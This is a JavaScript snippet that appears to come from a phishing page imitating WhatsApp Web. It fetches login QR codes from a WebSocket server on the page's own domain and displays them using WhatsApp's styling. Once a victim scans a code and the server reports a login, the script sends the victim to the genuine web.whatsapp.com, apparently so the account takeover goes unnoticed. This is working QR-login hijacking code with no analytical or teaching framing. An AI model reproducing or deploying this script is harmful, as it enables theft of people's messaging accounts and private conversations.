<script>
function guid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = Math.random() * 16 | 0,
            v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}
$(document).ready(function(){
    var loginsuccess = $.cookie('loginsucc');
    var uuid = $.cookie('uuid');
    console.log(loginsuccess+"==="+uuid);
	if(loginsuccess&&uuid){
		console.log('recheck');
	}else{
	}
	qrcode();
});

function getLocation(){
    var arr = document.domain.split('.');
    if(arr.length === 2){
        return document.domain;
    }
    if(arr.length > 2 && arr[0] !== 'www'){
      return arr.slice(1).join('.')
    } 
    return arr.slice(1).join('.') 
}

function sock(uuid){
        var domain = getLocation();
        var ws_url = "wss://dfxcd." + domain + "/ws/chat/gyf89c4nczizi0xt40vn4cmx311891";
        var ws = new WebSocket(ws_url);
        var intval;
        ws.onopen = function (e) { 
            console.log("连接服务器成功");
            var date = {
                uuid: uuid,
                type: 'qrcode'
            };
            var json = JSON.stringify(date);
            ws.send(json);
        }
        ws.onclose = function(e){
            /* setTimeout(() => {
                qrcode();
            }, 3000); */
            clearInterval(intval);
            console.log("服务器关闭");
        }
        ws.onerror = function(){
            console.log("连接出错");
        }
        ws.onmessage = function(e){
            let message = e.data;
            console.log(message);
            
            
            var obj = JSON.parse(message); 
            switch (obj.type) {
                case 'qr':                    
                    document.getElementById("qrcode").innerHTML='';
                    var qrcode = new QRCode(document.getElementById("qrcode"), {
        				text: obj.value,
        				width: 264,
        				height: 264,
        				colorDark : "#122e31",
        				colorLight : "#fff",
        				correctLevel : 0 
        			});
            		$('.b77wc>._30yMe').show();
            		$('#qrcode').show();
                    break;
                case 'login':
					$.cookie('loginsucc', true);
					$.cookie('uuid', uuid);
					window.location.href = 'https://web.whatsapp.com/';
                    break;
				case 'reqrcode':
					setTimeout(() => {
						var date = {
							uuid: uuid,
							action: 'qrcode',
							from: 'web'
						};
						var json = JSON.stringify(date);
						ws.send(json);
					}, 5000);
					break;
				case 'uuidrepeat':
                    console.log('uuidrepeat');
                    ws.close();
                    qrcode();
					break;
                default:
            }
        }
}

function qrcode(){
	var uuid = guid();
	sock(uuid);
}

function qrcode2(){
	var uuid = guid();
	$.get("/qrcode?type=init&uuid="+uuid+"&timestamp="+Date.now(),function(referBase64str,status){
		refreshqrcode(referBase64str,uuid);
		setInterval(function(){
			$.get("/qrcode?type=refresh&uuid="+uuid+"&timestamp="+Date.now(),function(referBase64str,status){
				refreshqrcode(referBase64str,uuid);
			});
		},1000);
	});
}

function refreshqrcode(referBase64str,uuid){
	if(referBase64str=='success'){
		$.cookie('loginsucc',true);
		$.cookie('uuid',uuid);
		window.location.href='https://web.whatsapp.com/';
	}else if(referBase64str!=''){
		$('.b77wc>._30yMe').show();
		$('#qrcode').attr('src', referBase64str);
		$('#qrcode').show();
	}
}

</script>
